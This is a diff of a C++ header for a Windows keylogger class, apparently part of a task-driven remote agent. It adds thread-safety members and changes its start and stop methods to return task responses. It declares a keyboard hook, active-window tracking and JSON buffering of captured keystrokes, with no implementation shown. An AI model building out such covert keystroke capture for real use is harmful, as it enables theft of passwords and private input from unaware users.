@@ -28,6 +28,11 @@ SOFTWARE.
 #include <windows.h>
 #include <stdio.h>
 #include <string>
+#include <atomic>
+#include <mutex>
+#include <thread>
+
+#include "Task.h"
 
 #pragma comment(lib, "user32.lib")
 
@@ -41,26 +46,30 @@ struct KeyloggerState
 class Keylogger
 {
 public:
-    int keylog_start(const int &taskID);
-    TaskResponse<std::string> get_keylog_data(const int &taskID);
+    ~Keylogger();
+    Response keylog_start(const int &taskID);
+    Response get_keylog_data(const int &taskID);
 
 private:
     static LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam);
-    static Keylogger *active_instance;
+    static std::atomic<Keylogger *> active_instance;
 
     bool first_json_entry = true;
-    bool logging_enabled = false;
+    std::atomic_bool logging_enabled = false;
     HHOOK keyboard_hook = NULL;
     DWORD hook_thread_id = 0;
+    std::thread hook_thread;
+    std::mutex state_mutex;
     std::string current_window = "";
     std::string keylog_data = "[";
     HWND last_window = NULL;
 
+    void hook_loop();
     std::string escape_json(const std::string &value);
     void append_json_event(const std::string &type, const std::string &value,
                            const std::string &window);
     std::string get_active_window_title();
-    int keylog_stop();
+    bool keylog_stop();
 };
 
 #endif
